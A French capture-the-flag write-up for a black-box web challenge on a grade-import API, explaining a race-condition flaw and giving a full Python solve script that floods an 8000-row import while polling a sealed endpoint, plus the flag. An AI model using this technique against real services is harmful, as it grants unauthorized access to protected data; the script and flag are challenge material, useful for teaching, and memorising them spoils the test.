# Régie — Writeup

## Énoncé (HTL)

- **Titre :** Régie
- **Catégorie :** webex
- **Points :** 547
- **Solves :** 72
- **Connexion :** `http://web.ctf.yogosha.com:8007`

> Régie est la console d'importation du logiciel de gestion des notes. Les
> enseignants soumettent des lots de notes, avec une ligne par élève.
> Le bulletin consolidé scellé vous est inaccessible.

## Protections / modèle

Pas de sources fournies : challenge en **boîte noire**. La page d'accueil (`GET /`)
décrit l'API (JSON) :

```json
{
  "endpoints": {
    "POST /import": "submit a grade batch, one row per line: eleve;matiere;note",
    "GET /status": "whether a reconciliation is currently open on your session",
    "GET /bulletin/sealed": "the sealed consolidated bulletin"
  },
  "limits": { "max_rows": 8000, "max_body_bytes": 524288 },
  "note": "The sealed bulletin is released only while a reconciliation is open,
           so an importer can check a batch against it before the figures are final."
}
```

- Une **session** est posée via le cookie `regie_session`.
- `GET /bulletin/sealed` renvoie une erreur tant qu'**aucune réconciliation n'est
  ouverte** sur la session :
  `"the sealed bulletin is released only while a reconciliation is open"`.
- Un `POST /import` simple (2 lignes) répond `"imported"` en `0.0 s` et, juste
  après, `GET /status` montre `reconciliation_open: false`. La fenêtre est donc
  déjà refermée quand on regarde.

## Vulnérabilité : fenêtre de course (TOCTOU) pendant l'import

La réconciliation n'est ouverte **que pendant le traitement d'un lot**. Le bulletin
scellé est lisible seulement durant cette fenêtre. Avec un petit lot, la fenêtre
dure quelques millisecondes et se referme avant toute requête.

Mais le traitement est **synchrone et proportionnel au nombre de lignes** : un lot
de 8000 lignes (le maximum) prend **~12 secondes** côté serveur. Pendant ces 12 s,
la réconciliation est **ouverte** sur notre session, et `GET /bulletin/sealed`
devient accessible.

Il suffit donc, **sur la même session** (même cookie `regie_session`) :

1. de lancer un gros import en tâche de fond (il tient la fenêtre ouverte) ;
2. de marteler `GET /bulletin/sealed` en parallèle jusqu'à récupérer le bulletin.

Le flag confirme l'idée : *la fenêtre est aussi large que vous la faites*.

## Résolution pas à pas

1. On amorce une session (récupère le cookie) et on garde un *opener* qui le
   conserve pour toutes les requêtes :

```python
import urllib.request, http.cookiejar
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.open(base + "/status").read()          # pose regie_session
```

2. On fabrique un lot de 8000 lignes `eleve;matiere;note` (format demandé) :

```python
batch = "\n".join(f"Eleve{i:04d} Nom;maths;{10+(i%10)}.5" for i in range(8000)).encode()
```

3. On lance l'import dans un thread (il va occuper ~12 s) :

```python
import threading
def importer():
    op.open(urllib.request.Request(base+"/import", data=batch, method="POST"), timeout=60).read()
threading.Thread(target=importer).start()
```

4. Pendant ce temps, on interroge le bulletin jusqu'à ce qu'il s'ouvre :

```python
import time, re
while True:
    b = op.open(base + "/bulletin/sealed").read().decode()
    m = re.search(r"HTL\{[^}]*\}", b)
    if m: print(m.group(0)); break
    time.sleep(0.1)
```

## Script complet -> Script intégral

```python
#!/usr/bin/env python3
# Régie — la réconciliation n'est ouverte que PENDANT le traitement d'un import.
# On lance un gros import (qui tient la fenêtre ouverte ~12s) et, sur la MÊME
# session, on interroge /bulletin/sealed en parallèle.
# Usage: python3 solve.py <host> <port>        (def: web.ctf.yogosha.com 8007)
import sys, threading, time, re, urllib.request, http.cookiejar

host = sys.argv[1] if len(sys.argv) > 1 else "web.ctf.yogosha.com"
port = sys.argv[2] if len(sys.argv) > 2 else "8007"
base = f"http://{host}:{port}"

# Gros lot : une ligne par élève, assez de lignes pour que l'import dure ~10s.
batch = "\n".join(f"Eleve{i:04d} Nom;maths;{10 + (i % 10)}.5" for i in range(8000)).encode()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.open(base + "/status", timeout=15).read()      # amorce le cookie regie_session

flag = {}
def importer():
    op.open(urllib.request.Request(base + "/import", data=batch, method="POST"), timeout=60).read()
def poller():
    t0 = time.time()
    while time.time() - t0 < 25 and "flag" not in flag:
        try:
            b = op.open(base + "/bulletin/sealed", timeout=15).read().decode()
        except Exception:
            continue
        m = re.search(r"HTL\{[^}]*\}", b)
        if m:
            flag["flag"] = m.group(0); print("[+] bulletin:", b[:300]); break
        time.sleep(0.1)

ti = threading.Thread(target=importer)
tp = threading.Thread(target=poller)
ti.start(); time.sleep(0.2); tp.start(); ti.join(); tp.join()
print("[+] Flag :", flag.get("flag", "(non trouvé)"))
```

## Flag

```
HTL{th3_w1nd0w_1s_4s_w1d3_4s_y0u_m4k3_1t}
```

*(Challenge en boîte noire — résolu directement sur l'instance HTL. Un import de
2 lignes se termine en 0,0 s (fenêtre déjà fermée) ; un import de 8000 lignes dure
~12 s et laisse `/bulletin/sealed` accessible pendant tout ce temps.)*
